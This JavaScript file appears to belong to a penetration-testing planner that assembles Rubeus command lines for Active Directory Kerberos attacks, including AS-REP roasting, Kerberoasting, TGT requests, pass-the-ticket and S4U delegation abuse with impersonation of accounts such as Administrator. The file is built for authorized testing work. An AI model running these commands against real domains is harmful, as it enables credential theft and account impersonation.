// Obol v3.6 methodology overlay — first-class Rubeus command planning tied to existing AD maneuvers.
(function(root){
'use strict';
const lanes=root.OBOL_LANES||[];
function clean36(v){return String(v==null?'':v).replace(/[\r\n]+/g,' ').trim();}
function value36(v){v=clean36(v);if(!v)return'';return /[\s"]/.test(v)?'"'+v.replace(/"/g,'\\"')+'"':v;}
function sw36(name,v){v=value36(v);return v?' /'+name+':'+v:'';}
function flag36(name,on){return on?' /'+name:'';}
function credential36(v){const t=['password','aes256','rc4'].includes(v.authType)?v.authType:'rc4';return sw36(t,v.material);}
const fields={
 user:{id:'user',label:'User',source:'user',placeholder:'svc_backup'},
 domain:{id:'domain',label:'Domain',source:'domain',placeholder:'corp.local'},
 dc:{id:'dc',label:'Domain controller',source:'target',placeholder:'10.10.10.10'},
 outfile:{id:'outfile',label:'Output file',source:'hashfile',placeholder:'loot/rubeus.txt'},
 spn:{id:'spn',label:'SPN',source:'spn',placeholder:'cifs/server.corp.local'},
 ticket:{id:'ticket',label:'Ticket file or base64',source:'ticket',fallbackSource:'file',placeholder:'C:\\Temp\\ticket.kirbi'},
 impersonate:{id:'impersonate',label:'Impersonate user',source:'impersonate',placeholder:'Administrator'},
 altservice:{id:'altservice',label:'Alternate service',source:'',placeholder:'cifs,host'},
 authType:{id:'authType',label:'Credential material',type:'select',options:[['rc4','NTLM / RC4'],['aes256','AES256'],['password','Password']],default:'rc4'},
 material:{id:'material',label:'Credential value',source:'hash',placeholder:'hash / AES key / password'}
};
const actions={
 asrep:{id:'asrep',label:'AS-REP Roast',cardId:'asrep-roast',summary:'Request AS-REP material for accounts that do not require Kerberos pre-authentication.',fields:['user','domain','dc','outfile'],toggles:[{id:'hashcat',label:'Hashcat format',default:true},{id:'nowrap',label:'Do not wrap output',default:true}],expectedFacts:['kerberos.asrep_hash']},
 kerberoast:{id:'kerberoast',label:'Kerberoast',cardId:'kerberoast',summary:'Request service tickets for SPN-bearing accounts and preserve crackable TGS material.',fields:['user','spn','domain','dc','outfile'],toggles:[{id:'nowrap',label:'Do not wrap output',default:true}],expectedFacts:['kerberos.tgs_hash']},
 asktgt:{id:'asktgt',label:'Ask TGT',cardId:'kerberos-tickets',summary:'Request a TGT using supplied credential material, with optional ticket injection.',fields:['user','domain','dc','authType','material'],toggles:[{id:'ptt',label:'Pass ticket into current session',default:false},{id:'nowrap',label:'Do not wrap output',default:true}],expectedFacts:['kerberos.ticket']},
 ptt:{id:'ptt',label:'Pass the Ticket',cardId:'kerberos-tickets',summary:'Import an existing Kerberos ticket into the current Windows logon session.',fields:['ticket'],toggles:[],expectedFacts:['kerberos.ticket']},
 s4u:{id:'s4u',label:'S4U / Delegation',cardId:'delegation-abuse',summary:'Build an S4U request for an already-established constrained or resource-based delegation path.',fields:['user','domain','dc','authType','material','impersonate','spn','altservice'],toggles:[{id:'ptt',label:'Pass resulting ticket',default:true},{id:'nowrap',label:'Do not wrap output',default:true}],expectedFacts:['kerberos.ticket']}
};
function defaults36(id){const a=actions[id]||actions.asrep,out={};for(const f of a.fields||[]){const d=fields[f];if(d&&d.default!=null)out[f]=d.default;}for(const t of a.toggles||[])out[t.id]=!!t.default;return out;}
function build36(id,v){v={...defaults36(id),...(v||{})};let out='Rubeus.exe ';
 if(id==='asrep')out+='asreproast'+sw36('user',v.user)+sw36('domain',v.domain)+sw36('dc',v.dc)+sw36('outfile',v.outfile)+flag36('format:hashcat',v.hashcat)+flag36('nowrap',v.nowrap);
 else if(id==='kerberoast')out+='kerberoast'+sw36('user',v.user)+sw36('spn',v.spn)+sw36('domain',v.domain)+sw36('dc',v.dc)+sw36('outfile',v.outfile)+flag36('nowrap',v.nowrap);
 else if(id==='asktgt')out+='asktgt'+sw36('user',v.user)+sw36('domain',v.domain)+sw36('dc',v.dc)+credential36(v)+flag36('ptt',v.ptt)+flag36('nowrap',v.nowrap);
 else if(id==='ptt')out+='ptt'+sw36('ticket',v.ticket);
 else if(id==='s4u')out+='s4u'+sw36('user',v.user)+sw36('domain',v.domain)+sw36('dc',v.dc)+credential36(v)+sw36('impersonateuser',v.impersonate)+sw36('msdsspn',v.spn)+sw36('altservice',v.altservice)+flag36('ptt',v.ptt)+flag36('nowrap',v.nowrap);
 else return'';
 return out.trim();
}
function card36(id){for(const l of lanes)for(const c of l.cards||[])if(c.id===id)return c;return null;}
for(const l of lanes)for(const c of l.cards||[])for(const cmd of c.commands||[]){if(String(cmd.tool||'').toLowerCase()!=='rubeus')continue;const r=String(cmd.run||'').toLowerCase();if(/\basreproast\b/.test(r))cmd.builder36={action:'asrep'};else if(/\bkerberoast\b/.test(r))cmd.builder36={action:'kerberoast'};else if(/\basktgt\b/.test(r))cmd.builder36={action:'asktgt'};else if(/\bptt\b/.test(r))cmd.builder36={action:'ptt'};}
const delegation=card36('delegation-abuse');
if(delegation&&!((delegation.commands||[]).some(x=>String(x.tool||'').toLowerCase()==='rubeus'&&/\bs4u\b/i.test(String(x.run||''))))){
 delegation.commands=delegation.commands||[];
 delegation.commands.push({tool:'Rubeus',run:'Rubeus.exe s4u /user:{{user}} /rc4:{{hash}} /impersonateuser:{{impersonate}} /msdsspn:{{spn}} /ptt',note:'Windows S4U implementation for an already-proven delegation path. Tool Library → Rubeus owns the full domain/DC, credential-material, alternate-service, PTT, and output controls.',builder36:{action:'s4u'}});
}
const registry=root.OBOL_TOOLS_V22&&root.OBOL_TOOLS_V22.tools;
if(registry&&!registry.rubeus)registry.rubeus={label:'Rubeus',bin:'Rubeus.exe',aliases:['Rubeus'],kali:'external',package:'',install:'Obtain or build GhostPack Rubeus for the authorized Windows lab environment. Obol never installs or executes it.',verify:'Rubeus.exe',source:'https://github.com/GhostPack/Rubeus',docs:'https://github.com/GhostPack/Rubeus',preference:90,capabilities:['ad','kerberos','asrep','kerberoast','tickets','delegation']};
root.OBOL_RUBEUS_V36={version:'3.6.0',fields,actions,defaults:defaults36,build:build36,sources:{rubeus:'https://github.com/GhostPack/Rubeus',orangeMindmap:'https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg'}};
})(typeof window!=='undefined'?window:globalThis);
